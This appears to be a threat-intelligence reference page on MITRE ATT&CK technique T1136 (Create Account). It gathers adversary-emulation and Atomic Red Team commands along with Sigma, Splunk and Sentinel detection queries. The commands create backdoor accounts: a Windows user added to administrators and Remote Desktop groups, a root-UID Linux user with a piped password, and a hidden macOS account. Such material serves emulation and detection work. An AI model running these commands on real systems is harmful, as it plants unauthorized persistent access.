
# Create Account

## Description

### MITRE Description

> Adversaries with a sufficient level of access may create a local system, domain, or cloud tenant account. Such accounts may be used for persistence that do not require persistent remote access tools to be deployed on the system.

In cloud environments, adversaries may create accounts that only have access to specific services, which can reduce the chance of detection.

### Windows

The <code>net user</code> commands can be used to create a local or domain account.

### Office 365

An adversary with access to a Global Admin account can create another account and assign it the Global Admin role for persistent access to the Office 365 tenant.(Citation: Microsoft O365 Admin Roles)(Citation: Microsoft Support O365 Add Another Admin, October 2019)

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: None
* Permissions: ['Administrator']
* Platforms: ['Linux', 'macOS', 'Windows', 'AWS', 'GCP', 'Azure AD', 'Azure', 'Office 365']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1136

## Potential Commands

```
Add backdoor user account:
net user support_388945a0 somepasswordhere /add /y
net localgroup administrators support_388945a0 /add
net localgroup "remote desktop users" support_388945a0 /add
Add backdoor user account:
shell net user support_388945a0 somepasswordhere /add /y
shell net localgroup administrators support_388945a0 /add
shell net localgroup "remote desktop users" support_388945a0 /add
post/windows/manage/add_user_domain
Enable backdoor user account:
net user support_388945a0 /active:yes
net localgroup administrators support_388945a0 /add
net localgroup "remote desktop users" support_388945a0 /add
Enable backdoor user account:
shell net user support_388945a0 /active:yes
shell net localgroup administrators support_388945a0 /add
shell net localgroup "remote desktop users" support_388945a0 /add
useradd -M -N -r -s /bin/bash -c evil_account evil_user

dscl . -create /Users/evil_user
dscl . -create /Users/evil_user UserShell /bin/bash
dscl . -create /Users/evil_user RealName "#{realname}"
dscl . -create /Users/evil_user UniqueID "1010"
dscl . -create /Users/evil_user PrimaryGroupID 80
dscl . -create /Users/evil_user NFSHomeDirectory /Users/evil_user

dscl . -create /Users/#{username}
dscl . -create /Users/#{username} UserShell /bin/bash
dscl . -create /Users/#{username} RealName "Evil Account"
dscl . -create /Users/#{username} UniqueID "1010"
dscl . -create /Users/#{username} PrimaryGroupID 80
dscl . -create /Users/#{username} NFSHomeDirectory /Users/#{username}

net user /add "T1136_CMD" "#{password}"

net user /add "#{username}" "T1136_CMD!"

New-LocalUser -Name "T1136_PowerShell" -NoPassword

useradd -o -u 0 -g 0 -M -d /root -s /bin/bash butter
echo "#{password}" | passwd --stdin butter

useradd -o -u 0 -g 0 -M -d /root -s /bin/bash #{username}
echo "BetterWithButter" | passwd --stdin #{username}

Net.exe user /add
Net.exe localgroup administrators * /add
Net.exe user * \password \domain
Net.exe dsadd user
powershell/persistence/misc/add_netuser
powershell/persistence/misc/add_netuser
powershell/privesc/powerup/service_useradd
powershell/privesc/powerup/service_useradd
useradd -M -N -r -s /bin/bash -c "#{comment}" #{username}
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash #{username}
```

## Commands Dataset

```
[{'command': 'Add backdoor user account:\n'
             'net user support_388945a0 somepasswordhere /add /y\n'
             'net localgroup administrators support_388945a0 /add\n'
             'net localgroup "remote desktop users" support_388945a0 /add',
  'name': 'Built-in Windows Command',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'Add backdoor user account:\n'
             'shell net user support_388945a0 somepasswordhere /add /y\n'
             'shell net localgroup administrators support_388945a0 /add\n'
             'shell net localgroup "remote desktop users" support_388945a0 '
             '/add',
  'name': 'Cobalt Strike',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'post/windows/manage/add_user_domain',
  'name': 'Metasploit',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'Enable backdoor user account:\n'
             'net user support_388945a0 /active:yes\n'
             'net localgroup administrators support_388945a0 /add\n'
             'net localgroup "remote desktop users" support_388945a0 /add',
  'name': 'Built-in Windows Command',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'Enable backdoor user account:\n'
             'shell net user support_388945a0 /active:yes\n'
             'shell net localgroup administrators support_388945a0 /add\n'
             'shell net localgroup "remote desktop users" support_388945a0 '
             '/add',
  'name': 'Cobalt Strike',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'useradd -M -N -r -s /bin/bash -c evil_account evil_user\n',
  'name': None,
  'source': 'atomics/T1136/T1136.yaml'},
 {'command': 'dscl . -create /Users/evil_user\n'
             'dscl . -create /Users/evil_user UserShell /bin/bash\n'
             'dscl . -create /Users/evil_user RealName "#{realname}"\n'
             'dscl . -create /Users/evil_user UniqueID "1010"\n'
             'dscl . -create /Users/evil_user PrimaryGroupID 80\n'
             'dscl . -create /Users/evil_user NFSHomeDirectory '
             '/Users/evil_user\n',
  'name': None,
  'source': 'atomics/T1136/T1136.yaml'},
 {'command': 'dscl . -create /Users/#{username}\n'
             'dscl . -create /Users/#{username} UserShell /bin/bash\n'
             'dscl . -create /Users/#{username} RealName "Evil Account"\n'
             'dscl . -create /Users/#{username} UniqueID "1010"\n'
             'dscl . -create /Users/#{username} PrimaryGroupID 80\n'
             'dscl . -create /Users/#{username} NFSHomeDirectory '
             '/Users/#{username}\n',
  'name': None,
  'source': 'atomics/T1136/T1136.yaml'},
 {'command': 'net user /add "T1136_CMD" "#{password}"\n',
  'name': None,
  'source': 'atomics/T1136/T1136.yaml'},
 {'command': 'net user /add "#{username}" "T1136_CMD!"\n',
  'name': None,
  'source': 'atomics/T1136/T1136.yaml'},
 {'command': 'New-LocalUser -Name "T1136_PowerShell" -NoPassword\n',
  'name': None,
  'source': 'atomics/T1136/T1136.yaml'},
 {'command': 'useradd -o -u 0 -g 0 -M -d /root -s /bin/bash butter\n'
             'echo "#{password}" | passwd --stdin butter\n',
  'name': None,
  'source': 'atomics/T1136/T1136.yaml'},
 {'command': 'useradd -o -u 0 -g 0 -M -d /root -s /bin/bash #{username}\n'
             'echo "BetterWithButter" | passwd --stdin #{username}\n',
  'name': None,
  'source': 'atomics/T1136/T1136.yaml'},
 {'command': 'Net.exe user /add',
  'name': None,
  'source': 'Threat Hunting Tables'},
 {'command': 'Net.exe localgroup administrators * /add',
  'name': None,
  'source': 'Threat Hunting Tables'},
 {'command': 'Net.exe user * \\password \\domain',
  'name': None,
  'source': 'Threat Hunting Tables'},
 {'command': 'Net.exe dsadd user',
  'name': None,
  'source': 'Threat Hunting Tables'},
 {'command': 'powershell/persistence/misc/add_netuser',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/persistence/misc/add_netuser',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/privesc/powerup/service_useradd',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/privesc/powerup/service_useradd',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'useradd -M -N -r -s /bin/bash -c "#{comment}" #{username}',
  'name': None,
  'source': 'Kirtar22/Litmus_Test'},
 {'command': 'useradd -o -u 0 -g 0 -M -d /root -s /bin/bash #{username}',
  'name': None,
  'source': 'Kirtar22/Litmus_Test'}]
```

## Potential Detections

```json
[{'data_source': '/var/log/secure with "useradd"  and "userdel"'},
 {'data_source': {'author': 'Patrick Bareiss',
                  'description': 'Detects local user creation on windows '
                                 "servers, which shouldn't happen in an Active "
                                 'Directory environment. Apply this Sigma Use '
                                 'Case on your windows server logs and not on '
                                 'your DC logs.',
                  'detection': {'condition': 'selection',
                                'selection': {'EventID': 4720}},
                  'falsepositives': ['Domain Controller Logs',
                                     'Local accounts managed by privileged '
                                     'account management tools'],
                  'fields': ['EventCode', 'AccountName', 'AccountDomain'],
                  'id': '66b6be3d-55d0-4f47-9855-d69df21740ea',
                  'level': 'low',
                  'logsource': {'product': 'windows', 'service': 'security'},
                  'references': ['https://patrick-bareiss.com/detecting-local-user-creation-in-ad-with-sigma/'],
                  'status': 'experimental',
                  'tags': ['attack.persistence', 'attack.t1136'],
                  'title': 'Detects local user creation'}},
 {'data_source': ['4688', 'Process Execution']},
 {'data_source': ['4688 ', 'Process CMD Line']},
 {'data_source': ['4624', 'Authentication logs']},
 {'data_source': ['Windows event logs']},
 {'data_source': ['4688', 'Process Execution']},
 {'data_source': ['4688 ', 'Process CMD Line']},
 {'data_source': ['4624', 'Authentication logs']},
 {'data_source': ['Windows event logs']}]
```

## Potential Queries

```json
[{'name': 'Create Account',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 1and (process_command_line contains '
           '"New-LocalUser"or process_command_line contains "net user add")'},
 {'name': None,
  'product': 'Splunk',
  'query': 'index=main  source="/var/log/secure" eventtype=useradd | table '
           'user,host,src, UID, GID'},
 {'name': None,
  'product': 'Splunk',
  'query': 'index=linux source="/var/log/secure" eventtype=userdel delete| '
           'table user,host'},
 {'name': None,
  'product': 'Splunk',
  'query': 'Root Account Creation: index=linux  source="/var/log/secure" '
           'eventtype=useradd UID=0 OR GID=0'}]
```

## Raw Dataset

```json
[{'Mitre APT3 Adversary Emulation Field Manual': {'Built-in Windows Command': 'Add '
                                                                              'backdoor '
                                                                              'user '
                                                                              'account:\n'
                                                                              'net '
                                                                              'user '
                                                                              'support_388945a0 '
                                                                              'somepasswordhere '
                                                                              '/add '
                                                                              '/y\n'
                                                                              'net '
                                                                              'localgroup '
                                                                              'administrators '
                                                                              'support_388945a0 '
                                                                              '/add\n'
                                                                              'net '
                                                                              'localgroup '
                                                                              '"remote '
                                                                              'desktop '
                                                                              'users" '
                                                                              'support_388945a0 '
                                                                              '/add',
                                                  'Category': 'T1136',
                                                  'Cobalt Strike': 'Add '
                                                                   'backdoor '
                                                                   'user '
                                                                   'account:\n'
                                                                   'shell net '
                                                                   'user '
                                                                   'support_388945a0 '
                                                                   'somepasswordhere '
                                                                   '/add /y\n'
                                                                   'shell net '
                                                                   'localgroup '
                                                                   'administrators '
                                                                   'support_388945a0 '
                                                                   '/add\n'
                                                                   'shell net '
                                                                   'localgroup '
                                                                   '"remote '
                                                                   'desktop '
                                                                   'users" '
                                                                   'support_388945a0 '
                                                                   '/add',
                                                  'Description': 'Create a '
                                                                 'backdoor '
                                                                 'user account '
                                                                 'that often '
                                                                 'appears on '
                                                                 'windows '
                                                                 'systems and '
                                                                 'add that '
                                                                 'user to the '
                                                                 'local '
                                                                 'administrators '
                                                                 'group and '
                                                                 'the remote '
                                                                 'desktop '
                                                                 'users group. '
                                                                 'This '
                                                                 'combined '
                                                                 'with the '
                                                                 'sticky keys '
                                                                 'persistence '
                                                                 'grants an '
                                                                 'inocuous '
                                                                 'system level '
                                                                 'persistence '
                                                                 'mechanism.',
                                                  'Metasploit': 'post/windows/manage/add_user_domain'}},
 {'Mitre APT3 Adversary Emulation Field Manual': {'Built-in Windows Command': 'Enable '
                                                                              'backdoor '
                                                                              'user '
                                                                              'account:\n'
                                                                              'net '
                                                                              'user '
                                                                              'support_388945a0 '
                                                                              '/active:yes\n'
                                                                              'net '
                                                                              'localgroup '
                                                                              'administrators '
                                                                              'support_388945a0 '
                                                                              '/add\n'
                                                                              'net '
                                                                              'localgroup '
                                                                              '"remote '
                                                                              'desktop '
                                                                              'users" '
                                                                              'support_388945a0 '
                                                                              '/add',
                                                  'Category': 'T1136',
                                                  'Cobalt Strike': 'Enable '
                                                                   'backdoor '
                                                                   'user '
                                                                   'account:\n'
                                                                   'shell net '
                                                                   'user '
                                                                   'support_388945a0 '
                                                                   '/active:yes\n'
                                                                   'shell net '
                                                                   'localgroup '
                                                                   'administrators '
                                                                   'support_388945a0 '
                                                                   '/add\n'
                                                                   'shell net '
                                                                   'localgroup '
                                                                   '"remote '
                                                                   'desktop '
                                                                   'users" '
                                                                   'support_388945a0 '
                                                                   '/add',
                                                  'Description': 'If the '
                                                                 'support_388945a0 '
                                                                 'account '
                                                                 'already '
                                                                 'exists on '
                                                                 'the system, '
                                                                 'but is '
                                                                 'disabled, '
                                                                 'you can '
                                                                 'enable it '
                                                                 'and then add '
                                                                 'it to the '
                                                                 'necessary '
                                                                 'groups.',
                                                  'Metasploit': ''}},
 {'Atomic Red Team Test - Create Account': {'atomic_tests': [{'auto_generated_guid': '40d8eabd-e394-46f6-8785-b9bfa1d011d2',
                                                              'description': 'Create '
                                                                             'a '
                                                                             'user '
                                                                             'via '
                                                                             'useradd\n',
                                                              'executor': {'cleanup_command': 'userdel '
                                                                                              '#{username}\n',
                                                                           'command': 'useradd '
                                                                                      '-M '
                                                                                      '-N '
                                                                                      '-r '
                                                                                      '-s '
                                                                                      '/bin/bash '
                                                                                      '-c '
                                                                                      'evil_account '
                                                                                      '#{username}\n',
                                                                           'elevation_required': True,
                                                                           'name': 'bash'},
                                                              'input_arguments': {'username': {'default': 'evil_user',
                                                                                               'description': 'Username '
                                                                                                              'of '
                                                                                                              'the '
                                                                                                              'user '
                                                                                                              'to '
                                                                                                              'create',
                                                                                               'type': 'String'}},
                                                              'name': 'Create '
                                                                      'a user '
                                                                      'account '
                                                                      'on a '
                                                                      'Linux '
                                                                      'system',
                                                              'supported_platforms': ['linux']},
                                                             {'auto_generated_guid': '01993ba5-1da3-4e15-a719-b690d4f0f0b2',
                                                              'description': 'Creates '
                                                                             'a '
                                                                             'user '
                                                                             'on '
                                                                             'a '
                                                                             'MacOS '
                                                                             'system '
                                                                             'with '
                                                                             'dscl\n',
                                                              'executor': {'cleanup_command': 'dscl '
                                                                                              '. '
                                                                                              '-delete '
                                                                                              '/Users/#{username}\n',
                                                                           'command': 'dscl '
                                                                                      '. '
                                                                                      '-create '
                                                                                      '/Users/#{username}\n'
                                                                                      'dscl '
                                                                                      '. '
                                                                                      '-create '
                                                                                      '/Users/#{username} '
                                                                                      'UserShell '
                                                                                      '/bin/bash\n'
                                                                                      'dscl '
                                                                                      '. '
                                                                                      '-create '
                                                                                      '/Users/#{username} '
                                                                                      'RealName '
                                                                                      '"#{realname}"\n'
                                                                                      'dscl '
                                                                                      '. '
                                                                                      '-create '
                                                                                      '/Users/#{username} '
                                                                                      'UniqueID '
                                                                                      '"1010"\n'
                                                                                      'dscl '
                                                                                      '. '
                                                                                      '-create '
                                                                                      '/Users/#{username} '
                                                                                      'PrimaryGroupID '
                                                                                      '80\n'
                                                                                      'dscl '
                                                                                      '. '
                                                                                      '-create '
                                                                                      '/Users/#{username} '
                                                                                      'NFSHomeDirectory '
                                                                                      '/Users/#{username}\n',
                                                                           'elevation_required': True,
                                                                           'name': 'bash'},
                                                              'input_arguments': {'realname': {'default': 'Evil '
                                                                                                          'Account',
                                                                                               'description': "'realname' "
                                                                                                              'to '
                                                                                                              'record '
                                                                                                              'when '
                                                                                                              'creating '
                                                                                                              'the '
                                                                                                              'user',
                                                                                               'type': 'String'},
                                                                                  'username': {'default': 'evil_user',
                                                                                               'description': 'Username '
                                                                                                              'of '
                                                                                                              'the '
                                                                                                              'user '
                                                                                                              'to '
                                                                                                              'create',
                                                                                               'type': 'String'}},
                                                              'name': 'Create '
                                                                      'a user '
                                                                      'account '
                                                                      'on a '
                                                                      'MacOS '
                                                                      'system',
                                                              'supported_platforms': ['macos']},
                                                             {'auto_generated_guid': '6657864e-0323-4206-9344-ac9cd7265a4f',
                                                              'description': 'Creates '
                                                                             'a '
                                                                             'new '
                                                                             'user '
                                                                             'in '
                                                                             'a '
                                                                             'command '
                                                                             'prompt. '
                                                                             'Upon '
                                                                             'execution, '
                                                                             '"The '
                                                                             'command '
                                                                             'completed '
                                                                             'successfully." '
                                                                             'will '
                                                                             'be '
                                                                             'displayed. '
                                                                             'To '
                                                                             'verify '
                                                                             'the\n'
                                                                             'new '
                                                                             'account, '
                                                                             'run '
                                                                             '"net '
                                                                             'user" '
                                                                             'in '
                                                                             'powershell '
                                                                             'or '
                                                                             'CMD '
                                                                             'and '
                                                                             'observe '
                                                                             'that '
                                                                             'there '
                                                                             'is '
                                                                             'a '
                                                                             'new '
                                                                             'user '
                                                                             'named '
                                                                             '"T1136_CMD"\n',
                                                              'executor': {'cleanup_command': 'net '
                                                                                              'user '
                                                                                              '/del '
                                                                                              '"#{username}" '
                                                                                              '>nul '
                                                                                              '2>&1\n',
                                                                           'command': 'net '
                                                                                      'user '
                                                                                      '/add '
                                                                                      '"#{username}" '
                                                                                      '"#{password}"\n',
                                                                           'elevation_required': True,
                                                                           'name': 'command_prompt'},
                                                              'input_arguments': {'password': {'default': 'T1136_CMD!',
                                                                                               'description': 'Password '
                                                                                                              'of '
                                                                                                              'the '
                                                                                                              'user '
                                                                                                              'to '
                                                                                                              'create',
                                                                                               'type': 'String'},
                                                                                  'username': {'default': 'T1136_CMD',
                                                                                               'description': 'Username '
                                                                                                              'of '
                                                                                                              'the '
                                                                                                              'user '
                                                                                                              'to '
                                                                                                              'create',
                                                                                               'type': 'String'}},
                                                              'name': 'Create '
                                                                      'a new '
                                                                      'user in '
                                                                      'a '
                                                                      'command '
                                                                      'prompt',
                                                              'supported_platforms': ['windows']},
                                                             {'auto_generated_guid': 'bc8be0ac-475c-4fbf-9b1d-9fffd77afbde',
                                                              'description': 'Creates '
                                                                             'a '
                                                                             'new '
                                                                             'user '
                                                                             'in '
                                                                             'PowerShell. '
                                                                             'Upon '
                                                                             'execution, '
                                                                             'details '
                                                                             'about '
                                                                             'the '
                                                                             'new '
                                                                             'account '
                                                                             'will '
                                                                             'be '
                                                                             'displayed '
                                                                             'in '
                                                                             'the '
                                                                             'powershell '
                                                                             'session. '
                                                                             'To '
                                                                             'verify '
                                                                             'the\n'
                                                                             'new '
                                                                             'account, '
                                                                             'run '
                                                                             '"net '
                                                                             'user" '
                                                                             'in '
                                                                             'powershell '
                                                                             'or '
                                                                             'CMD '
                                                                             'and '
                                                                             'observe '
                                                                             'that '
                                                                             'there '
                                                                             'is '
                                                                             'a '
                                                                             'new '
                                                                             'user '
                                                                             'named '
                                                                             '"T1136_PowerShell"\n',
                                                              'executor': {'cleanup_command': 'Remove-LocalUser '
                                                                                              '-Name '
                                                                                              '"#{username}" '
                                                                                              '-ErrorAction '
                                                                                              'Ignore\n',
                                                                           'command': 'New-LocalUser '
                                                                                      '-Name '
                                                                                      '"#{username}" '
                                                                                      '-NoPassword\n',
                                                                           'elevation_required': True,
                                                                           'name': 'powershell'},
                                                              'input_arguments': {'username': {'default': 'T1136_PowerShell',
                                                                                               'description': 'Username '
                                                                                                              'of '
                                                                                                              'the '
                                                                                                              'user '
                                                                                                              'to '
                                                                                                              'create',
                                                                                               'type': 'String'}},
                                                              'name': 'Create '
                                                                      'a new '
                                                                      'user in '
                                                                      'PowerShell',
                                                              'supported_platforms': ['windows']},
                                                             {'auto_generated_guid': 'a1040a30-d28b-4eda-bd99-bb2861a4616c',
                                                              'description': 'Creates '
                                                                             'a '
                                                                             'new '
                                                                             'user '
                                                                             'in '
                                                                             'Linux '
                                                                             'and '
                                                                             'adds '
                                                                             'the '
                                                                             'user '
                                                                             'to '
                                                                             'the '
                                                                             '`root` '
                                                                             'group. '
                                                                             'This '
                                                                             'technique '
                                                                             'was '
                                                                             'used '
                                                                             'by '
                                                                             'adversaries '
                                                                             'during '
                                                                             'the '
                                                                             'Butter '
                                                                             'attack '
                                                                             'campaign.\n',
                                                              'executor': {'cleanup_command': 'userdel '
                                                                                              '#{username}\n',
                                                                           'command': 'useradd '
                                                                                      '-o '
                                                                                      '-u '
                                                                                      '0 '
                                                                                      '-g '
                                                                                      '0 '
                                                                                      '-M '
                                                                                      '-d '
                                                                                      '/root '
                                                                                      '-s '
                                                                                      '/bin/bash '
                                                                                      '#{username}\n'
                                                                                      'echo '
                                                                                      '"#{password}" '
                                                                                      '| '
                                                                                      'passwd '
                                                                                      '--stdin '
                                                                                      '#{username}\n',
                                                                           'elevation_required': True,
                                                                           'name': 'bash'},
                                                              'input_arguments': {'password': {'default': 'BetterWithButter',
                                                                                               'description': 'Password '
                                                                                                              'of '
                                                                                                              'the '
                                                                                                              'user '
                                                                                                              'to '
                                                                                                              'create',
                                                                                               'type': 'String'},
                                                                                  'username': {'default': 'butter',
                                                                                               'description': 'Username '
                                                                                                              'of '
                                                                                                              'the '
                                                                                                              'user '
                                                                                                              'to '
                                                                                                              'create',
                                                                                               'type': 'String'}},
                                                              'name': 'Create '
                                                                      'a new '
                                                                      'user in '
                                                                      'Linux '
                                                                      'with '
                                                                      '`root` '
                                                                      'UID and '
                                                                      'GID.',
                                                              'supported_platforms': ['linux']}],
                                            'attack_technique': 'T1136',
                                            'display_name': 'Create Account'}},
 {'Threat Hunting Tables': {'chain_id': '100133',
                            'commandline_string': 'user /add',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'low',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1136',
                            'mitre_caption': 'create_account',
                            'os': 'windows',
                            'parent_process': 'Net.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': '',
                            'sub_process_2': ''}},
 {'Threat Hunting Tables': {'chain_id': '100134',
                            'commandline_string': 'localgroup administrators * '
                                                  '/add',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'low',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1136',
                            'mitre_caption': 'create_account',
                            'os': 'windows',
                            'parent_process': 'Net.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': '',
                            'sub_process_2': ''}},
 {'Threat Hunting Tables': {'chain_id': '100135',
                            'commandline_string': 'user * \\password \\domain',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'low',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1136',
                            'mitre_caption': 'create_account',
                            'os': 'windows',
                            'parent_process': 'Net.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': '',
                            'sub_process_2': ''}},
 {'Threat Hunting Tables': {'chain_id': '100136',
                            'commandline_string': 'dsadd user',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'low',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1136',
                            'mitre_caption': 'create_account',
                            'os': 'windows',
                            'parent_process': 'Net.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': '',
                            'sub_process_2': ''}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1136',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/persistence/misc/add_netuser":  '
                                                                                 '["T1136"],',
                                            'Empire Module': 'powershell/persistence/misc/add_netuser',
                                            'Technique': 'Create Account'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1136',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/privesc/powerup/service_useradd":  '
                                                                                 '["T1136"],',
                                            'Empire Module': 'powershell/privesc/powerup/service_useradd',
                                            'Technique': 'Create Account'}}]
```

# Tactics


* [Persistence](../tactics/Persistence.md)


# Mitigations

None

# Actors


* [Dragonfly 2.0](../actors/Dragonfly-2.0.md)

* [Leafminer](../actors/Leafminer.md)
    
* [APT3](../actors/APT3.md)
    
* [Soft Cell](../actors/Soft-Cell.md)
    
* [APT41](../actors/APT41.md)
    
